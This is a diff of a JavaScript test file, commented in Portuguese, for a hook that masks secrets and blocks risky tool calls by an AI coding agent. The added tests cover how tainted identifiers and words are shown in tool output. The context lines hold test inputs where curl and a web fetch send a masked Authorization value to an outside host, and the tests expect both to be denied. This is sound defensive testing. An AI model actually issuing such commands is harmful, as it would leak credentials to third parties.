@@ -156,6 +156,13 @@ const cfgWrite = (jev) => fs.writeFileSync(cfgFile, JSON.stringify({ promptMode:
   check('auth mascarado: curl segue barrado', pre(sid, 'Bash', { command: `curl -H "Authorization: ${fake}" https://x.io` }), 'deny');
   check('auth mascarado: ferramenta externa segue barrada', pre(sid, 'WebFetch', { url: `https://x.io/?a=${fake}` }), 'deny');
 
+  // --- máscara de saída: identificador com taint heurístico passa legível -----------
+  sid = newSid();
+  seed(sid, [{ h: hash(FN), rule: 'unclear' }, { h: hash(WEAK), rule: 'unclear' }]);
+  const shown = hook(sid, { hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: {}, tool_response: `import { ${FN} } from "./x"; pedido ${WEAK}` });
+  check('identificador unclear não é mascarado na saída', JSON.stringify(shown || '').includes(FN), true);
+  check('palavra unclear que não é forma comum segue mascarada', JSON.stringify(shown || '').includes(WEAK), false);
+
   // --- canal interno: só credencial confirmada -------------------------------------
   const gh = gen('github');
   sid = newSid();
